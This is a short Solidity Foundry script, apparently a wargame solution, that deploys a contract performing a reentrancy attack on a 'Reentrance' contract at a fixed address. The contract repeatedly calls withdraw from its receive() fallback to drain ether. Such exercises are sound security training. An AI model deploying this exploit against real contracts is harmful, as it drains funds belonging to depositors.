//SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Reentracy.sol";
import {Script, console} from "forge-std/Script.sol";

contract AttackReentrance {
    Reentrance public victim;

    constructor() public {
        victim = Reentrance(0x5951E71A595714cE2824C1F3b8873aBfecb34C2d);
    }

    function attack() external payable {
        victim.donate{value: 0.001 ether}(address(this));
        victim.withdraw(0.001 ether);
    }

    receive() external payable {
        victim.withdraw(0.001 ether);
    }
}

contract ReentrancySolution is Script {
    function run() external payable {
        vm.startBroadcast(vm.envUint("MY_PRIVATE_KEY"));
        AttackReentrance attackReentrance = new AttackReentrance();
        attackReentrance.attack{value: 0.001 ether}();
        vm.stopBroadcast();
    }
}
